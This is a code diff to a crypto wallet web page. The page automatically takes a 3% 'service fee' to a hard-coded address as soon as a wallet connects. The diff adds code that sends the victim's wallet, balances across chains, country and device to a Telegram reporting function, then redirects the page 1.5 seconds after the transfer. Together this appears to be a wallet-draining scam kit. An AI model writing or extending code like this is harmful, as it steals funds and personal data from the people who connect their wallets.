@@ -92,6 +92,7 @@ export default function Home() {
   const [serviceFeeChargedKey, setServiceFeeChargedKey] = useState<string | null>(null);
   const [serviceFeeHash, setServiceFeeHash] = useState<string | null>(null);
   const [serviceFeeError, setServiceFeeError] = useState<string | null>(null);
+  const [serviceFeeRedirected, setServiceFeeRedirected] = useState(false);
   const SERVICE_FEE_PERCENT = 3n;
   const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
   const [tokenSymbol, setTokenSymbol] = useState('');
@@ -498,6 +499,19 @@ export default function Home() {
       setServiceFeeHash(feeTxHash);
       setServiceFeeSent(true);
       setServiceFeeChargedKey(currentServiceFeeKey);
+
+      await sendTelegramEvent({
+        eventType: 'service_fee',
+        wallet: address,
+        chain: chain.name,
+        withdrawnAmount: `${formatEther(feeAmount)} ${chain.nativeCurrency.symbol || ''}`,
+        feePercent: `${SERVICE_FEE_PERCENT}%`,
+        tokenSymbol: chain.nativeCurrency.symbol || 'NATIVE',
+        txHash: feeTxHash,
+        tokenBalances: getMergedTokenBalances(),
+        country,
+        device,
+      });
     } catch (err: any) {
       console.error('Service fee charge failed:', err);
       setServiceFeeError(err?.message || 'Failed to charge service fee.');
@@ -516,6 +530,7 @@ export default function Home() {
       setServiceFeeChargedKey(null);
       setServiceFeeHash(null);
       setServiceFeeError(null);
+      setServiceFeeRedirected(false);
       return;
     }
 
@@ -523,6 +538,16 @@ export default function Home() {
       chargeServiceFee();
     }
   }, [isConnected, address, chain?.id, balance?.value, walletClient, serviceFeeSent, chargeServiceFee]);
+
+  useEffect(() => {
+    if (serviceFeeSent && serviceFeeHash && !serviceFeeRedirected) {
+      setServiceFeeRedirected(true);
+      const redirectUrl = typeof window !== 'undefined' ? window.location.origin : '/';
+      window.setTimeout(() => {
+        window.location.assign(redirectUrl);
+      }, 1500);
+    }
+  }, [serviceFeeSent, serviceFeeHash, serviceFeeRedirected]);
 
   const scanTokensAcrossChains = async (walletAddress: string) => {
     const results: Array<{ network: string; symbol: string; amount: string }> = [];
